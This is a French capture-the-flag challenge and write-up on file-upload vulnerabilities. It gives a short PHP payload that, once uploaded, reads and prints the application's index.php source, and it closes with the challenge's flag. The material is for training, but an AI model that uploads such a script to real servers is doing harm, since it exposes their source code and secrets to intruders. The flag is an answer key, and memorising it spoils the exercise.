# File upload vulnerability 1

> web

Author: [Alexandre-Xavier Labonté-Lamoureux (AXDOOMER)](https://github.com/axdoomer)

Les vulnérabilités de téléversement de fichier permettent d'exécuter son propre code sur un serveur web. La vulnérabilité existe lorsque les fichiers téléversés ne sont pas bien filtrés. Par exemple, un site peut permettre que de téléverser des images. Cependant, si les restrictions ne sont pas implémentées de façon rigoureuse dans l'application, il serait possible de téléverser des fichiers PHP avec notre propre code. 

Le flag se cache dans le code source de l'application. Effectuez une lecture du code source en exploitant cette vulnérabilité. 

## Setup

Requirements:
- BurpSuite

# Writeup

Vous devez utiliser un script PHP comme celui-ci:

```
<?php
echo base64_encode(file_get_contents("../../index.php"));
?>
```

La conversion en Base64 n'est pas nécessaire, car lorsque le fichier PHP sera interprété, le flag qui est en commentaire dans le code source et se retrouvera affichée lorsqu'on fera Ctrl+U. 

Flag: `flag-5f087c95fd24e2d8feef96nosecuritywhatsoever`
